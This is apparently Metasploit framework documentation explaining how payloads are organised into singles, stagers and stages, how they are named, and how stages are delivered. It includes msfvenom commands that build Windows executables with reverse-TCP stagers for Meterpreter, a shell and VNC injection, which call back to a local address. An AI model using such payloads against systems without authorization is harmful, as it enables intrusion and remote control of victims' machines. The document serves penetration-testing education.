# How Payloads Work

Payload modules are stored in `modules/payloads/{singles,stages,stagers}/<platform>`. When the framework starts up, stages are combined with stagers to create a complete payload that you can use in exploits. Then, handlers are paired with payloads so the framework will know how to create sessions with a given communications mechanism.

Payloads are given reference names that indicate all the pieces, like so:
  - Staged payloads: `<platform>/[arch]/<stage>/<stager>`
  - Single payloads: `<platform>/[arch]/<single>`

This results in payloads like `windows/x64/meterpreter/reverse_tcp`. Breaking that down, the platform is `windows`, the architecture is `x64`, the final stage we're delivering is `meterpreter`, and the stager delivering it is `reverse_tcp`.

Note that architecture is optional because in some cases it is either unnecessary or implied. An example is `php/meterpreter/reverse_tcp`. Arch is unneeded for PHP payloads because we're delivering interpreted code rather than native.

### Singles

Single payloads are fire-and-forget. They can create a communications mechanism with Metasploit, but they don't have to. An example of a scenario where you might want a single is when the target has no network access -- a fileformat exploit delivered via USB key is still possible.

### Stagers

Stagers are a small stub designed to create some form of communication and then pass execution to the next stage. Using a stager solves two problems. First, it allows us to use a small payload initially to load up a larger payload with more functionality. Second, it makes it possible to separate the communications mechanism from the final stage so one payload can be used with multiple transports without duplicating code.

### Stages

Since the stager will have taken care of dealing with any size restrictions by allocating a big chunk of memory for us to run in, stages can be arbitrarily large. One advantage of that is the ability to write final-stage payloads in a higher-level language like C.

## Delivering stages

1. The IP address and port you want the payload to connect back to are embedded in the stager. As discussed above, all staged payloads are no more than a small stub that sets up communication and executes the next stage. When you create an executable using a staged payload, you're really just creating the stager. So the following commands would create functionally identical exe files:
```
    msfvenom -f exe LHOST=192.168.1.1 -p windows/meterpreter/reverse_tcp
    msfvenom -f exe LHOST=192.168.1.1 -p windows/shell/reverse_tcp
    msfvenom -f exe LHOST=192.168.1.1 -p windows/vncinject/reverse_tcp
```
(Note that these are *functionally* identical -- there is a lot of randomization that goes into it so no two executables are exactly the same.)

1. The Ruby side acts as a client using whichever transport mechanism was set up by the stager (e.g.: tcp, http, https).
   * In the case of a shell stage, Metasploit will connect the remote process's stdio to your terminal when you interact with it.
   * In the case of a [[Meterpreter]] stage, Metasploit will begin speaking the Meterpreter wire protocol.


